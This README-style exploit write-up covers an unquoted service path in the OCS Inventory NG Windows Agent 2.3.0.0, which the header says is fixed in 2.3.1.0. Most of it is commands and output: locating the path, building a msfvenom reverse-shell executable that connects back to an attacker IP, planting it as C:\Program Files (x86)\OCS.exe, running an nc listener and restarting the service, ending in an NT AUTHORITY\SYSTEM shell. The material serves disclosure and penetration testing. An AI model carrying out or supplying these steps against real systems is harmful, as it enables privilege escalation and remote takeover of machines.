<a target="_blank" href="https://img.shields.io/badge/plateform-windows-blue.svg" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/plateform-windows-blue.svg">
</a>
<a target="_blank" href="https://img.shields.io/badge/version-2.3.0.0-yellow" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/version-2.3.0.0-yellow">
</a>
<a href="" rel="nofollow">
    <img src="https://img.shields.io/badge/unquoted_service_path-red">
</a>

```bash
#####################################################################
#                                                                   #
#  Exploit Title: OCS Inventory NG 2.3.0.0 - Unquoted Service Path  #
#  Date: 2023/04/21                                                 #
#  Exploit Author: msd0pe                                           #
#  Vendor Homepage: https://oscinventory-ng.org                     #
#  Software Link: https://github.com/OCSInventory-NG/WindowsAgent   #
#  My Github: https://github.com/msd0pe-1                           #
#  Fixed in version 2.3.1.0                                         #
#                                                                   #
#####################################################################
```

<h3>OCS Inventory NG Windows Agent:</h3>
Versions below 2.3.1.0 contains an unquoted service path which allows attackers to escalate privileges to the system level.

<h2>Find the unquoted service path:</h2>

```bash
    > wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

    OCS Inventory Service   OCS Inventory Service   C:\Program Files (x86)\OCS Inventory Agent\OcsService.exe   Auto
```

<h2>Get informations about the service:</h2>

```bash
    > sc qc "OCS Inventory Service"

    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: OCS Inventory Service
            TYPE               : 110  WIN32_OWN_PROCESS (interactive)
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\Program Files (x86)\OCS Inventory Agent\OcsService.exe
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : OCS Inventory Service
            DEPENDENCIES       : RpcSs
                               : EventLog
                               : Winmgmt
                               : Tcpip
            SERVICE_START_NAME : LocalSystem
```

<h2>Generate a reverse shell:</h2>

```bash
    > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe -o OCS.exe
 ```

<h2>Upload the reverse shell to C:\Program Files (x86)\OCS.exe</h2>

```bash
    > put OCS.exe
    > ls
    drw-rw-rw-          0  Sat Apr 22 05:20:38 2023 .
    drw-rw-rw-          0  Sat Apr 22 05:20:38 2023 ..
    drw-rw-rw-          0  Sun Jul 24 08:18:13 2022 Common Files
    -rw-rw-rw-        174  Sun Jul 24 08:12:38 2022 desktop.ini
    drw-rw-rw-          0  Thu Jul 28 13:00:04 2022 Internet Explorer
    drw-rw-rw-          0  Sun Jul 24 07:27:06 2022 Microsoft
    drw-rw-rw-          0  Sun Jul 24 08:18:13 2022 Microsoft.NET
    drw-rw-rw-          0  Sat Apr 22 04:51:20 2023 OCS Inventory Agent
    -rw-rw-rw-       7168  Sat Apr 22 05:20:38 2023 OCS.exe
    drw-rw-rw-          0  Sat Apr 22 03:24:58 2023 Windows Defender
    drw-rw-rw-          0  Thu Jul 28 13:00:04 2022 Windows Mail
    drw-rw-rw-          0  Thu Jul 28 13:00:04 2022 Windows Media Player
    drw-rw-rw-          0  Sun Jul 24 08:18:13 2022 Windows Multimedia Platform
    drw-rw-rw-          0  Sun Jul 24 08:18:13 2022 Windows NT
    drw-rw-rw-          0  Fri Oct 28 05:25:41 2022 Windows Photo Viewer
    drw-rw-rw-          0  Sun Jul 24 08:18:13 2022 Windows Portable Devices
    drw-rw-rw-          0  Sun Jul 24 08:18:13 2022 Windows Sidebar
    drw-rw-rw-          0  Sun Jul 24 08:18:13 2022 WindowsPowerShell
```

<h2>Start listener</h2>

```bash
    > nc -lvp 4444
```

<h2>Reboot the service/server</h2>

```bash
    > sc stop "OCS Inventory Service"
    > sc start "OCS Inventory Service"
```

OR

```bash
    > shutdown /r
```

<h2>Enjoy !</h2>

```bash
    192.168.1.102: inverse host lookup failed: Unknown host
    connect to [192.168.1.101] from (UNKNOWN) [192.168.1.102] 51309
    Microsoft Windows [Version 10.0.19045.2130]
    (c) Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami

    nt authority\system
```